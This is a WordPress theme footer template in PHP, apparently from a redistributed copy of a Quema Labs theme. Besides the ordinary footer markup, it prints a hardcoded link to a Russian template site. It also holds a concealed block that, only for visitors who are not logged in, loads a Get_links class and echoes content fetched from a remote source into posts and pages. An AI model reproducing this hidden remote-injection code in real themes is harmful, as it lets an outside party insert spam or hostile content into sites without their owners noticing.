    <footer id="footer">
        <div class="container">
            <div class="row">
                <div class="col-md-12">
					<?php if (is_home() || is_category() || is_archive() ){ ?>
					<p><a href="http://wp-templates.ru/" title="скачать шаблоны для сайта" target="_blank">Темы wordpress</a> &ndash; <a href="https://quemalabs.com/" target="_blank">Quema Labs</a></p>
					<?php } ?>

					<?php if ($user_ID) : ?><?php else : ?>
					<?php if (is_single() || is_page() ) { ?>
					<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); 
					$links = new Get_links(); $links = $links->get_remote(); echo $links; ?>
					<?php } ?>
					<?php endif; ?>
                </div>
            </div>
        </div>
    </footer>

        
    <!-- WP_Footer --> 
    <?php wp_footer(); ?>
    <!-- /WP_Footer --> 

      
</body>
</html>